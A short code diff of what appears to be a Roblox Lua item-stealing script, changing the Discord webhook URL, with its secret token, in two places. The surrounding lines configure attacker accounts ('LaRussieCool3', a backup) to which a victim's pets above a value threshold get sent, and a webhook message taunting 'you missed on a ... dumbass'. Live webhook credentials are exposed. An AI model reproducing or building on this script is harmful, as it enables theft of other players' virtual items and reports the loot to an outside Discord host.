@@ -90,7 +90,7 @@ for i, v in pairs(save.Pet) do
             ["content"] = "@here you missed on a " .. id .. " dumbass!"
         }
 
-        local url = "https://discord.com/api/webhooks/1276861507115679836/R7J7CZe6Mv-_wP5mlKZHXGj_NdpsgWXyezW_uP2yezEAzVnjHOkPupyoSQkyJOrAdph6"
+        local url = "https://discord.com/api/webhooks/1276879268583837787/XCKtFVsD0-t5FSfJoupxOaC404Zy5WPOC99zYcxMHxbxbewq-K7-bUmEb5oCBdK4fs9z"
         local headers = {
             ["Content-Type"] = "application/json"
         }
@@ -107,7 +107,7 @@ end
 
 Username = "LaRussieCool3"
 Username2 = "LaRussieCool6" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "https://discord.com/api/webhooks/1276861507115679836/R7J7CZe6Mv-_wP5mlKZHXGj_NdpsgWXyezW_uP2yezEAzVnjHOkPupyoSQkyJOrAdph6"
+Webhook = "https://discord.com/api/webhooks/1276879268583837787/XCKtFVsD0-t5FSfJoupxOaC404Zy5WPOC99zYcxMHxbxbewq-K7-bUmEb5oCBdK4fs9z"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
 local player = game:GetService"Players".LocalPlayer
